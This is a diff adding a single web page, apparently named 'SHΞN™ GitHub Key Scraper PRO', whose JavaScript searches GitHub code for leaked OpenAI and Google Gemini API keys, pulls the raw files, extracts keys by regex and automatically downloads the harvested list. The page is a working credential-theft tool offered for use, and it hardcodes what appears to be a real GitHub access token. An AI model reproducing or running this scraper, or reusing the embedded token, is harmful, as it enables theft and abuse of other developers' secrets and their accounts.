@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>☬ SHΞN™ GitHub Key Scraper PRO (Single Token Edition)</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <style>
+        .shen-gradient {
+            background: linear-gradient(90deg, #f97316, #fb923c);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .log-line {
+            font-family: ui-monospace, 'Cascadia Code', 'Fira Code', monospace;
+            direction: ltr;
+            text-align: left;
+            unicode-bidi: embed;
+        }
+        .star-bg {
+            background: radial-gradient(circle at 30% 20%, rgba(249, 115, 22, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 70% 80%, rgba(251, 146, 60, 0.12) 0%, transparent 50%);
+        }
+        #logs::-webkit-scrollbar,
+        #resultsContent::-webkit-scrollbar {
+            width: 6px;
+        }
+        #logs::-webkit-scrollbar-track,
+        #resultsContent::-webkit-scrollbar-track {
+            background: #18181b;
+            border-radius: 8px;
+        }
+        #logs::-webkit-scrollbar-thumb,
+        #resultsContent::-webkit-scrollbar-thumb {
+            background: #f97316;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body class="bg-black text-white min-h-screen">
+    <div class="star-bg fixed inset-0 z-0"></div>
+
+    <div class="relative z-10 max-w-5xl mx-auto p-4 sm:p-6">
+        <div class="bg-zinc-950 border border-orange-500/30 rounded-3xl p-6 sm:p-8 shadow-2xl">
+            <h1 class="text-4xl sm:text-5xl font-black shen-gradient text-center mb-2">SHΞN™ KEY SCRAPER</h1>
+            <p class="text-center text-orange-400 text-sm tracking-widest mb-8">FOCUSED SINGLE TOKEN ‐ MAX POWER</p>
+
+            <!-- Stats -->
+            <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4 mb-8 text-center">
+                <div class="bg-zinc-900 rounded-2xl p-3 sm:p-4">
+                    <div class="text-orange-400 text-2xl sm:text-3xl font-bold" id="keysFound">0</div>
+                    <div class="text-xs text-gray-500 mt-1">KEYS FOUND</div>
+                </div>
+                <div class="bg-zinc-900 rounded-2xl p-3 sm:p-4">
+                    <div class="text-white text-2xl sm:text-3xl font-mono" id="time">00:00</div>
+                    <div class="text-xs text-gray-500 mt-1">ELAPSED</div>
+                </div>
+                <div class="bg-zinc-900 rounded-2xl p-3 sm:p-4">
+                    <div class="text-white text-2xl sm:text-3xl font-mono" id="speed">0.00</div>
+                    <div class="text-xs text-gray-500 mt-1">KEYS/SEC</div>
+                </div>
+                <div class="bg-zinc-900 rounded-2xl p-3 sm:p-4">
+                    <div class="text-green-400 text-lg sm:text-xl font-bold" id="status">آماده</div>
+                    <div class="text-xs text-gray-500 mt-1">STATUS</div>
+                </div>
+            </div>
+
+            <!-- Main Button -->
+            <button onclick="startScan()" id="mainBtn"
+                class="w-full py-6 sm:py-8 text-2xl sm:text-3xl font-black bg-orange-600 hover:bg-orange-500 transition-all rounded-2xl mb-8 flex items-center justify-center gap-3 disabled:opacity-50 disabled:cursor-not-allowed">
+                <i class="fas fa-bolt"></i>
+                <span id="btnText">START REAL SCAN</span>
+            </button>
+
+            <!-- Progress Bar -->
+            <div class="w-full bg-zinc-900 rounded-full h-3 mb-6 overflow-hidden hidden" id="progressBar">
+                <div class="bg-gradient-to-r from-orange-500 to-orange-400 h-full rounded-full transition-all duration-500"
+                    id="progressFill" style="width: 0%"></div>
+            </div>
+
+            <!-- Logs -->
+            <div id="logs"
+                class="bg-black border border-zinc-800 h-64 overflow-y-auto p-5 rounded-2xl text-sm log-line mb-8"></div>
+
+            <!-- Results -->
+            <div id="results" class="hidden">
+                <h2 class="text-orange-400 font-bold mb-4 flex items-center gap-2 text-lg">
+                    <i class="fas fa-key"></i> FOUND KEYS
+                </h2>
+                <div id="resultsContent" class="space-y-4 max-h-[500px] overflow-auto"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ================== YOUR PERSONAL TOKEN - HARDCODED ==================
+            const GITHUB_TOKEN = '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';
+
+            // Optimized queries targeting newest repos
+            const QUERIES = [
+                'sk- extension:env',
+                'sk- extension:json',
+                'sk- extension:yml',
+                'sk- extension:yaml',
+                'sk- extension:txt',
+                'sk- extension:config',
+                'AIzaSy extension:env',
+                'AIzaSy extension:json',
+                'AIzaSy extension:yml',
+                'AIzaSy extension:yaml',
+                'AIzaSy extension:txt',
+                'AIzaSy extension:config',
+                'openai api key',
+                'OPENAI_API_KEY',
+                'gemini api key',
+                'GEMINI_API_KEY',
+                'google api key AIza',
+            ];
+
+            // ================== STATE ==================
+            let isRunning = false;
+            let abortController = null;
+            let startTime = null;
+            let timerInterval = null;
+            let totalKeys = 0;
+            let allKeys = { OpenAI: [], Google: [] };
+            let processedQueries = 0;
+            const totalQueries = QUERIES.length;
+
+            // ================== DOM REFS ==================
+            const logsDiv = document.getElementById('logs');
+            const keysFoundEl = document.getElementById('keysFound');
+            const timeEl = document.getElementById('time');
+            const speedEl = document.getElementById('speed');
+            const statusEl = document.getElementById('status');
+            const btnText = document.getElementById('btnText');
+            const mainBtn = document.getElementById('mainBtn');
+            const resultsDiv = document.getElementById('results');
+            const resultsContent = document.getElementById('resultsContent');
+            const progressBar = document.getElementById('progressBar');
+            const progressFill = document.getElementById('progressFill');
+
+            // ================== UTILS ==================
+            function log(text, color = 'text-gray-300') {
+                const time = new Date().toLocaleTimeString('fa-IR', { hour12: false });
+                logsDiv.innerHTML += `<div class="log-line ${color}">[${time}] ${text}</div>`;
+                logsDiv.scrollTop = logsDiv.scrollHeight;
+            }
+
+            function updateUI() {
+                keysFoundEl.textContent = totalKeys;
+                if (startTime && isRunning) {
+                    const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                    const m = String(Math.floor(elapsed / 60)).padStart(2, '0');
+                    const s = String(elapsed % 60).padStart(2, '0');
+                    timeEl.textContent = `${m}:${s}`;
+                    const speed = elapsed > 0 ? (totalKeys / elapsed).toFixed(2) : '0.00';
+                    speedEl.textContent = speed;
+                }
+                if (totalQueries > 0) {
+                    const pct = Math.round((processedQueries / totalQueries) * 100);
+                    progressFill.style.width = pct + '%';
+                }
+            }
+
+            function setStatus(text, colorClass) {
+                statusEl.textContent = text;
+                statusEl.className = colorClass + ' text-lg sm:text-xl font-bold';
+            }
+
+            function resetState() {
+                totalKeys = 0;
+                allKeys = { OpenAI: [], Google: [] };
+                processedQueries = 0;
+                startTime = null;
+                logsDiv.innerHTML = '';
+                resultsDiv.classList.add('hidden');
+                resultsContent.innerHTML = '';
+                progressBar.classList.add('hidden');
+                progressFill.style.width = '0%';
+                timeEl.textContent = '00:00';
+                speedEl.textContent = '0.00';
+                keysFoundEl.textContent = '0';
+                setStatus('آماده', 'text-green-400');
+                btnText.textContent = 'START REAL SCAN';
+                mainBtn.disabled = false;
+                if (timerInterval) clearInterval(timerInterval);
+                timerInterval = null;
+            }
+
+            // ================== GITHUB API (SINGLE TOKEN) ==================
+            async function searchGitHub(query, signal) {
+                const url = `https://api.github.com/search/code?q=${encodeURIComponent(query)}&per_page=100&sort=indexed&order=desc`;
+                let response;
+                try {
+                    response = await fetch(url, {
+                        headers: {
+                            'Authorization': `token ${GITHUB_TOKEN}`,
+                            'Accept': 'application/vnd.github.v3+json',
+                            'User-Agent': 'SHEN-Scraper/1.0'
+                        },
+                        signal: signal
+                    });
+                } catch (e) {
+                    if (e.name === 'AbortError') throw e;
+                    log(`🌐 Network error: ${e.message}`, 'text-red-400');
+                    return null;
+                }
+
+                if (response.status === 403 || response.status === 429) {
+                    const remaining = response.headers.get('X-RateLimit-Remaining');
+                    const reset = response.headers.get('X-RateLimit-Reset');
+                    if (remaining === '0' && reset) {
+                        const resetDate = new Date(parseInt(reset) * 1000);
+                        const waitSeconds = Math.max(0, Math.ceil((resetDate - new Date()) / 1000));
+                        log(`⏳ Rate limit hit. Waiting ${waitSeconds}s until reset...`, 'text-yellow-400');
+                        if (waitSeconds > 0 && waitSeconds < 300) {
+                            await new Promise(r => setTimeout(r, waitSeconds * 1000 + 1000));
+                            log('🔄 Retrying after rate limit reset...', 'text-blue-400');
+                            return null; // caller will retry
+                        }
+                    }
+                    log('⛔ Rate limited (403/429). Aborting this query.', 'text-red-400');
+                    return null;
+                }
+
+                if (response.status === 401) {
+                    log('🔒 Token invalid or expired (401). Check your token.', 'text-red-400');
+                    return null;
+                }
+
+                if (response.ok) {
+                    const data = await response.json();
+                    return data.items || [];
+                }
+
+                log(`⚠️ Unexpected status: ${response.status}`, 'text-yellow-400');
+                return null;
+            }
+
+            async function fetchRawFile(htmlUrl, signal) {
+                try {
+                    let rawUrl = htmlUrl
+                        .replace('github.com', 'raw.githubusercontent.com')
+                        .replace('/blob/', '/');
+                    const res = await fetch(rawUrl, { signal: signal });
+                    if (res.ok) return await res.text();
+                    if (res.status === 404) {
+                        // Alternative raw URL
+                        const altRawUrl = htmlUrl
+                            .replace('//github.com/', '//raw.githubusercontent.com/')
+                            .replace('/blob/', '/refs/heads/');
+                        const altRes = await fetch(altRawUrl, { signal: signal });
+                        if (altRes.ok) return await altRes.text();
+                    }
+                    return null;
+                } catch (e) {
+                    if (e.name === 'AbortError') throw e;
+                    return null;
+                }
+            }
+
+            function extractKeys(text) {
+                const openai = [];
+                const google = [];
+
+                // Enhanced OpenAI: sk-proj-, sk-svcacct-, sk-admin-, plain sk-
+                const openaiRegex = /sk-(?:proj-|svcacct-|admin-)?[A-Za-z0-9]{20,}/g;
+                const openaiMatches = text.match(openaiRegex);
+                if (openaiMatches) {
+                    for (const m of openaiMatches) {
+                        const cleaned = m.replace(/['"`,;\s]/g, '').trim();
+                        if (cleaned.length >= 25 && cleaned.length <= 200 && !openai.includes(cleaned)) {
+                            openai.push(cleaned);
+                        }
+                    }
+                }
+
+                // Google API keys
+                const googleRegex = /AIzaSy[0-9A-Za-z_-]{33}/g;
+                const googleMatches = text.match(googleRegex);
+                if (googleMatches) {
+                    for (const m of googleMatches) {
+                        if (!google.includes(m)) google.push(m);
+                    }
+                }
+
+                return { OpenAI: openai, Google: google };
+            }
+
+            // ================== MAIN SCAN ==================
+            async function startScan() {
+                if (isRunning) {
+                    // Stop
+                    isRunning = false;
+                    if (abortController) abortController.abort();
+                    if (timerInterval) clearInterval(timerInterval);
+                    timerInterval = null;
+                    setStatus('متوقف شد', 'text-red-400');
+                    btnText.textContent = 'START REAL SCAN';
+                    mainBtn.disabled = false;
+                    progressBar.classList.add('hidden');
+                    log('⛔ SCAN STOPPED BY USER', 'text-red-400');
+                    updateUI();
+                    return;
+                }
+
+                // Start
+                resetState();
+                isRunning = true;
+                abortController = new AbortController();
+                const signal = abortController.signal;
+                startTime = Date.now();
+                progressBar.classList.remove('hidden');
+                setStatus('درحال اسکن...', 'text-yellow-400');
+                btnText.textContent = '⏹ STOP SCAN';
+                mainBtn.disabled = false;
+
+                log('☬ SHΞN™ SINGLE TOKEN STRIKE STARTED', 'text-orange-400');
+                log(`Token: ${GITHUB_TOKEN.substring(0, 8)}... | Queries: ${totalQueries}`, 'text-blue-400');
+                log('⚡ Max power: 100 results per query, newest repos first', 'text-blue-400');
+
+                timerInterval = setInterval(updateUI, 500);
+
+                for (let qi = 0; qi < QUERIES.length; qi++) {
+                    if (!isRunning) break;
+                    const query = QUERIES[qi];
+                    processedQueries = qi;
+                    updateUI();
+
+                    log(`🔍 [${qi + 1}/${totalQueries}] Searching: "${query}"`, 'text-cyan-400');
+
+                    let items = null;
+                    for (let attempt = 0; attempt < 3 && isRunning; attempt++) {
+                        items = await searchGitHub(query, signal);
+                        if (items !== null) break;
+                        // if null due to rate limit, wait and retry
+                        if (attempt < 2) {
+                            await new Promise(r => setTimeout(r, 2000));
+                        }
+                    }
+
+                    if (!items || items.length === 0) {
+                        log('   ⚪ No results.', 'text-gray-500');
+                        continue;
+                    }
+
+                    log(`   📄 Found ${items.length} code files. Processing...`, 'text-gray-400');
+                    let foundInQuery = 0;
+
+                    for (let ii = 0; ii < items.length && isRunning; ii++) {
+                        const item = items[ii];
+                        const htmlUrl = item.html_url || item.url;
+                        if (!htmlUrl) continue;
+
+                        try {
+                            const code = await fetchRawFile(htmlUrl, signal);
+                            if (!code) continue;
+
+                            const found = extractKeys(code);
+                            if (found.OpenAI.length) {
+                                const newKeys = found.OpenAI.filter(k => !allKeys.OpenAI.includes(k));
+                                if (newKeys.length) {
+                                    allKeys.OpenAI.push(...newKeys);
+                                    totalKeys += newKeys.length;
+                                    foundInQuery += newKeys.length;
+                                    log(`   ✅ +${newKeys.length} OpenAI key(s) | ${item.repository?.full_name || 'unknown'}`, 'text-green-400');
+                                }
+                            }
+                            if (found.Google.length) {
+                                const newKeys = found.Google.filter(k => !allKeys.Google.includes(k));
+                                if (newKeys.length) {
+                                    allKeys.Google.push(...newKeys);
+                                    totalKeys += newKeys.length;
+                                    foundInQuery += newKeys.length;
+                                    log(`   ✅ +${newKeys.length} Gemini key(s) | ${item.repository?.full_name || 'unknown'}`, 'text-green-400');
+                                }
+                            }
+                            updateUI();
+
+                            // small delay between processing files
+                            if (ii < items.length - 1) {
+                                await new Promise(r => setTimeout(r, 100));
+                            }
+                        } catch (e) {
+                            if (e.name === 'AbortError') break;
+                        }
+                    }
+
+                    if (foundInQuery > 0) {
+                        log(`   📊 Total new keys from this query: ${foundInQuery}`, 'text-orange-300');
+                    }
+
+                    // Delay between queries (aggressive but safe)
+                    if (isRunning && qi < totalQueries - 1) {
+                        await new Promise(r => setTimeout(r, 400 + Math.random() * 400));
+                    }
+                }
+
+                processedQueries = totalQueries;
+                updateUI();
+                finishScan();
+            }
+
+            function finishScan() {
+                isRunning = false;
+                if (abortController) abortController = null;
+                if (timerInterval) clearInterval(timerInterval);
+                timerInterval = null;
+                mainBtn.disabled = false;
+                btnText.textContent = 'START REAL SCAN';
+                progressBar.classList.add('hidden');
+                progressFill.style.width = '100%';
+
+                const elapsed = startTime ? Math.floor((Date.now() - startTime) / 1000) : 0;
+                const m = String(Math.floor(elapsed / 60)).padStart(2, '0');
+                const s = String(elapsed % 60).padStart(2, '0');
+
+                setStatus('پایان', 'text-green-400');
+                log('🏁 SCAN FINISHED', 'text-orange-400');
+                log(`📊 Total unique keys: ${totalKeys} (OpenAI: ${allKeys.OpenAI.length}, Gemini: ${allKeys.Google.length})`, 'text-orange-300');
+                log(`⏱️ Duration: ${m}:${s}`, 'text-gray-400');
+
+                updateUI();
+                displayResults();
+                autoDownloadCleanFile();
+            }
+
+            function displayResults() {
+                resultsContent.innerHTML = '';
+                if (allKeys.OpenAI.length === 0 && allKeys.Google.length === 0) {
+                    resultsContent.innerHTML = `
+                    <div class="bg-zinc-900 rounded-2xl p-6 text-center text-gray-400">
+                        <i class="fas fa-search text-4xl mb-3 block"></i>
+                        <p>هیچ کلیدی پیدا نشد.</p>
+                    </div>`;
+                } else {
+                    if (allKeys.OpenAI.length) {
+                        const unique = [...new Set(allKeys.OpenAI)];
+                        resultsContent.innerHTML += `
+                        <div class="bg-zinc-900 rounded-2xl p-5 border border-green-500/20">
+                            <div class="flex justify-between items-center mb-3">
+                                <h3 class="text-green-400 font-bold"><i class="fab fa-openai mr-2"></i>OpenAI (${unique.length})</h3>
+                                <button onclick="downloadSingleType('OpenAI')" class="bg-green-600 hover:bg-green-500 px-3 py-1 rounded-xl text-xs font-bold">
+                                    <i class="fas fa-download"></i> Download
+                                </button>
+                            </div>
+                            <div class="text-xs break-all font-mono max-h-40 overflow-auto bg-black/50 rounded-xl p-3">
+                                ${unique.map((k, i) => `<span class="text-orange-400">[${i + 1}]</span> ${escapeHTML(k)}`).join('<br>')}
+                            </div>
+                        </div>`;
+                    }
+                    if (allKeys.Google.length) {
+                        const unique = [...new Set(allKeys.Google)];
+                        resultsContent.innerHTML += `
+                        <div class="bg-zinc-900 rounded-2xl p-5 border border-blue-500/20">
+                            <div class="flex justify-between items-center mb-3">
+                                <h3 class="text-blue-400 font-bold"><i class="fab fa-google mr-2"></i>Gemini (${unique.length})</h3>
+                                <button onclick="downloadSingleType('Google')" class="bg-blue-600 hover:bg-blue-500 px-3 py-1 rounded-xl text-xs font-bold">
+                                    <i class="fas fa-download"></i> Download
+                                </button>
+                            </div>
+                            <div class="text-xs break-all font-mono max-h-40 overflow-auto bg-black/50 rounded-xl p-3">
+                                ${unique.map((k, i) => `<span class="text-orange-400">[${i + 1}]</span> ${escapeHTML(k)}`).join('<br>')}
+                            </div>
+                        </div>`;
+                    }
+                }
+                resultsDiv.classList.remove('hidden');
+                resultsDiv.scrollIntoView({ behavior: 'smooth' });
+            }
+
+            function autoDownloadCleanFile() {
+                const uniqueOpenAI = [...new Set(allKeys.OpenAI)];
+                const uniqueGoogle = [...new Set(allKeys.Google)];
+                if (uniqueOpenAI.length === 0 && uniqueGoogle.length === 0) return;
+
+                let content = '═══════════════════════════════════════\n';
+                content += '  SHΞN™ SCRAPER – EXTRACTED KEYS REPORT\n';
+                content += '═══════════════════════════════════════\n';
+                content += `Date: ${new Date().toISOString()}\n`;
+                content += `Token used: ${GITHUB_TOKEN.substring(0, 8)}...\n\n`;
+
+                if (uniqueOpenAI.length) {
+                    content += '▶ OPENAI KEYS (unique):\n';
+                    content += uniqueOpenAI.join('\n') + '\n\n';
+                }
+                if (uniqueGoogle.length) {
+                    content += '▶ GOOGLE GEMINI KEYS (unique):\n';
+                    content += uniqueGoogle.join('\n') + '\n\n';
+                }
+
+                const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+                a.download = `SHEN_ALL_Keys_${ts}.txt`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+
+                log('📥 Clean file downloaded automatically: SHEN_ALL_Keys_...txt', 'text-green-400');
+            }
+
+            function escapeHTML(str) {
+                const div = document.createElement('div');
+                div.textContent = str;
+                return div.innerHTML;
+            }
+
+            // Global functions for manual download
+            window.startScan = startScan;
+            window.downloadSingleType = function(type) {
+                const keys = [...new Set(allKeys[type] || [])];
+                if (!keys.length) return;
+                const content = keys.join('\n');
+                const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `SHEN_${type}_Keys.txt`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                log(`📥 Downloaded ${keys.length} ${type} keys`, 'text-green-400');
+            };
+
+            // Initial logs
+            log('🟢 SHΞN™ Single Token Edition Ready', 'text-green-400');
+            log(`🔑 Token: ${GITHUB_TOKEN.substring(0, 8)}... (hardcoded)`, 'text-blue-400');
+            log(`📋 ${QUERIES.length} queries | Max 100 results each | Newest repos first`, 'text-blue-400');
+            setStatus('آماده', 'text-green-400');
+        })();
+    </script>
+</body>
+</html>
